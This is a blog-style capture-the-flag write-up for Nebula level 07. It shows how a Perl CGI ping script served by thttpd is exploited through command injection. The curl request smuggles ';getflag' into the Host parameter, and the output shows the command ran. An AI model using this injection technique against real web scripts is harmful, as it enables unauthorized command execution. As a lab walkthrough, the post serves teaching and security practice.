---
layout: post
title: "Reachable from the web"
category: CTF, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 07](http://exploit-exercises.com/nebula/level07) Agenda**: "The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server."
<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "*It was the Perl's script, the one who swooned over the network flow.*"

<center>
	<img src="/images/2015-03-28-reachable_hosts/208716045eef408eef4fcd07.jpg">
</center>

<br />

As usual, started with target account's home investigation.
{% highlight sh linenos %}
level07@nebula:/home/flag07$ ls -la
.........
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf

level07@nebula:/home/flag07$ cat ./thttpd.conf | less

# This file is for thttpd processes created by /etc/init.d/thttpd.
.........
# Specifies an alternate port number to listen on.
port=7007
.........
# Specifies a directory to chdir() to at startup. This is merely a convenience
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07
.........
# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi
.........
{% endhighlight %}

It appears that we have running [thttpd](http://www.acme.com/software/thttpd/thttpd_man.html) server on 7007 port with specified config from flag07 home folder (which in turns will execute all *.cgi scripts from there). 

{% highlight sh linenos %}
level07@nebula:/home/flag07$ ps aux | grep http
flag07 1187 ......... /usr/sbin/thttpd -C /home/flag07/thttpd.conf
flag16 1189 ......... /usr/sbin/thttpd -C /home/flag16/thttpd.conf
{% endhighlight %}

Indeed! And not the only one =).

From "*[index.cgi](https://exploit-exercises.com/nebula/level07/)*" source we can see that it takes value of "*Host*" argument, passes it as input to ping utility and print out the result. So let's make request with [curl](http://linux.die.net/man/1/curl) tool and use some kind of [separator](/ctf, nebula/2015/02/02/arbitrary_program_execution/) to inject the favour "*getflag*" command. Don't forget about [URL encoding](https://en.wikipedia.org/wiki/Percent-encoding).

{% highlight sh linenos %}
$curl --data-urlencode "Host=localhost;getflag" 192.168.1.3:7007/index.cgi
<html><head><title>Ping results</title></head><body><pre>PING localhost 
(127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=17.3 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=17.2 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=39.0 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2012ms
rtt min/avg/max/mdev = 17.251/24.558/39.073/10.263 ms
You have successfully executed getflag on a target account
{% endhighlight %}

Line #11, indicates the end of destination point. BTW "*192.168.1.3*" is address of Nebula virtual machine in my local network (use [ifconfig](http://linux.die.net/man/8/ifconfig) to find out for your case).

P.S. You could also try to deal with request from web browser or [wget](http://stackoverflow.com/questions/9830242/what-is-o-option-means-for-wget) [util](http://linux.die.net/man/1/wget) + some online [url encoder](http://www.url-encode-decode.com/) (or at least [wiki](https://en.wikipedia.org/wiki/Percent-encoding) percent-encoding of reserved characters table) as helper for clear argument performing.